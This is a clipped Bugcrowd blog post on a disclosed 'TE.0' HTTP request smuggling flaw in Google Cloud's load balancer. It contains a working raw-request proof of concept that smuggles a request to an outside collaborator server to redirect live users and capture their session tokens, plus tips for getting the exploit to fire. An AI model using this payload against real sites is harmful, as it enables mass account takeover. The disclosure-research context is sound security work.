---
title: "Unveiling TE.0 HTTP Request Smuggling: Discovering a Critical Vulnerability in Thousands of Google Cloud Websites | @Bugcrowd"
source: https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/?__readwiseLocation=
author:
  - Guest Post
published: 2024-07-17
created: 2025-08-12
description: We later discovered we had a powerful exploit affecting thousands of Google Cloud-hosted websites that were using their Load Balancer.
tags:
  - clippings/articles
aliases:
  - TE.0 smuggling vulnerabilities
---
# Unveiling TE.0 HTTP Request Smuggling: Discovering a Critical Vulnerability in Thousands of Google Cloud Websites | @Bugcrowd

![](https://www.bugcrowd.com/wp-content/uploads/2024/07/2305048_LevelUp-Unveiling_Opt1_071624.png)

> [!summary]
> The article discusses the discovery of a novel HTTP Request Smuggling vulnerability, dubbed \\"TE.0 HTTP Request Smuggling,\\" by a team of security researchers. This vulnerability, similar to the CL.0 variant but using Transfer-Encoding, was initially found on a major bank's API, allowing for mass 0-click account takeovers by leaking session tokens. The researchers later found that the exploit affected thousands of Google Cloud-hosted websites using their Load Balancer, particularly those configured to default to HTTP/1.1 instead of HTTP/2. This vulnerability allowed bypassing Google IAP (Identity-Aware Proxy) security, undermining Zero Trust principles. The article provides a PoC, testing tips, and outlines the disclosure timeline to Google, which resulted in an $8,500 bounty after some initial miscommunication.

## Introducing: TE.0 HTTP Request Smuggling

We believe the two best ways to come up with new payloads are:

- [https://github.com/narfindustries/http-garden:](https://github.com/narfindustries/http-garden) A #tools  for differential testing and fuzzing of HTTP servers and proxies.
- Bug bounty/VDP spray-and-pray: Adapting existing tools such as [smuggler.py](https://github.com/defparam/smuggler) by [defparam](https://x.com/defparam) to then scan a wide range of targets hoping for hits.

The quickest way to generate a scope to hack on is to use our own [bbscope](https://github.com/sw33tLie/bbscope) tool.

`bbscope bc -E "your_bugcrowd_email" -P "your_bugcrowd_password" -o u | tee bugcrowd-scope.txt`

## The idea

We eventually asked ourselves this question: why is there no `TE.0`?
Essentially, it could function in the same way as the `CL.0` variant but using `Transfer-Encoding` instead.

## The TE.0 PoC

```http
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X  
0
EMPTY_LINE_HERE  
EMPTY_LINE_HERE
```


By sending this request multiple times using `null payloads` in Burp Suite Intruder, we were effectively redirecting live users to our own collaborator server. Conveniently, this also had the side-effect of sending us the users’ session token.

## A wider discovery

We noticed that all the vulnerable targets appeared to be hosted on Google Cloud. Some had the classic `Via: 1.1 google` response header, while others were protected by Google IAP (Identity-Aware Proxy) authentication and returned the `Invalid IAP credentials: empty token` message when accessed without a valid session token

Thanks to the investigation via an affected company, we discovered the issue was within Google Cloud’s Load Balancer.

## Different exploitation techniques

The TE.0 PoC we presented earlier achieves a site-wide redirect to an attacker-controlled domain. This often has a critical impact by itself, but it’s not always the case.

However, those websites could still be exploited by leveraging application-specific gadgets, essentially achieving critical impact every time.

All the techniques used to exploit other types of smuggling attacks can also work with TE.0 smuggling attacks. If you’re unfamiliar, we recommend reading more

## TE.0 testing tips

Here are some things one should consider when testing for TE.0 smugglings according to our own experience:

- The chunk length — in our case having a value of `50` — has to be a hex number according to HTTP/1.1 RFC. Make sure the size is correct and not expressed in decimal format.
- After the final 0, which ends the last chunk in the request, you need two empty lines.
- Make sure and disable automatic content length adjustments so the `Content-Length` header won’t be added before the PoC request is sent.
- Experiment with different HTTP methods. The exploit we showcased in this blog post only worked with the OPTIONS method, as it was failing both with GET and POST.